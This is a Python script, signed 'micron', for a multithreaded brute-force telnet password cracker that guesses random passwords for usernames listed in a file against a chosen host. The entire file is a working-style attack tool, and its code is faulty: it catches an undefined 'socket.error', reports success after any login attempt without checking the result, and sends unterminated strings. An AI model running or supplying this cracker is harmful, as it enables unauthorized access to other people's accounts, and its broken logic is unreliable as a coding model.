__doc__ = """ If run as a script, this module creates an instance of
TelnetForce, a brute force password cracker for telnet.

-micron

"""

import telnetlib
import threading
from generator import StringGen
from socket import error

class TelnetForce(threading.Thread):
    """ This class, when run(), tries to connect to a speficied machine
    through telnet.  It extends threading.Thread for threading

    """

    def __init__(self, host, usrfile, pass_len, tries):
        """ Constructor that sets some values.  It calls the Thread's
        constructor first.

        params:
        pass_len -- the character length of guess passwords.
        usrfile -- the text file with usernames to try.
        tries -- the number of times to try to guess a password for some username.

        """
        threading.Thread.__init__(self)
        self.usrfile = usrfile
        self.pass_len = pass_len
        self.tries = tries
        self.host = host
        return
        
    
    def run(self):
        """ This function is called when the thread starts. """
        self.start_trying()
        return
    
    def attempt_login(self, _uname, _pword):
        """ This function connects to 'host' and tries to login.

        params:
        _uname -- the username to try.
        _pword -- the password to try.
        host -- the name of the machine we are connecting to.

        """
        tn = telnetlib.Telnet(self.host)
        try:
            tn.read_until(b"login: ")
        except EOFError:
            print("connection reset immediately")
            return 0
        #try a username
        try:
            tn.write(_uname)
        except socket.error:
            return 0
        try:
            tn.read_until(b"Password: ")
        except EOFError:
            return 0
        # try a password
        try:
            tn.write(_pword)
        except socket.error:
            return 0
        # check for success
        tn.close()
        return 1

    def start_trying(self):
        """ Start trying user/password combinations.  It will try to guess
        the password for a given name 'self.tries' times.

        """
        sg = StringGen()
        try:
            nfp = open(self.usrfile)
        except IOError:
            print('username file: %s could not be opened' % self.usrfile)
            return 0
        _uname = nfp.readline(15)
        _pass = sg.generate(self.pass_len)
        
        while not self.attempt_login(_uname, _pass) and _uname:
            _pass = sg.generate(self.pass_len)
            if self.tries == 0:
                _uname = nfp.readline(15)
                if not _uname:
                    return 0
                self.tries = 15
            self.tries = self.tries - 1            
        print('the password was: %s' % _pass)
        nfp.close()
        return 1

    def test(self, _uname, _pword):
        """Prints the user/passwords that would be tested.  This is just
        for offline debugging.

        params:
        _uname -- the username to try.
        _pword -- the password to try.

        """
        print("%s: pass: %s, name: %s" % (self.name, _pword, _uname))
        return 0

def start_her_up(host, pass_len=6, usrfile='usr.txt', tries=15):
    """ Starts a TelnetForce thread.

    params:
    pass_len -- the character length of guess passwords.
    usrfile -- the text file with usernames to try.
    tries -- the number of times to try to guess a password for some username.

    """
    tnf = TelnetForce(host, usrfile, pass_len, tries)
    tnf.start()
    return tnf

if __name__ == "__main__":
    from optparse import OptionParser
    
    threads = []
    
    parser = OptionParser()
    parser.add_option('-o', '--host', action='store', type='string',
                      dest='host', help='The host we are connecting to. Default=10.0.0.1',
                      default='10.0.0.1')
    parser.add_option('-u', '--user_file', action='store',
                      type='string', dest='ufile',
                      help='A file with a new-line delimitered list of usernames. Default="usr.txt"',
                      metavar='FILE', default='usr.txt')
    parser.add_option('-l', '--pw-len', action='store', type='int',
                      dest='pw_len', default=6,
                      help='The length of guessed passwords. Default=6')
    parser.add_option('-t', '--threads', action='store', type='int',
                      dest='t_count', help='number of threads to spawn. Default=3',
                      default=3)
    parser.add_option('-n', '--num-tries', action='store', type='int',
                      help='number of times to try to guess the password per name. Default=15 (should be much larger)',
                      dest='num_tries', default=15)
    (options, args) = parser.parse_args()

    print("Starting threads..\n")
    
    for i in range(options.t_count):
        threads.append(start_her_up(options.host, options.pw_len, options.ufile,
                                    options.num_tries))
    for i in range(options.t_count):
        threads[i].join()
        
    print('done.')
    
    
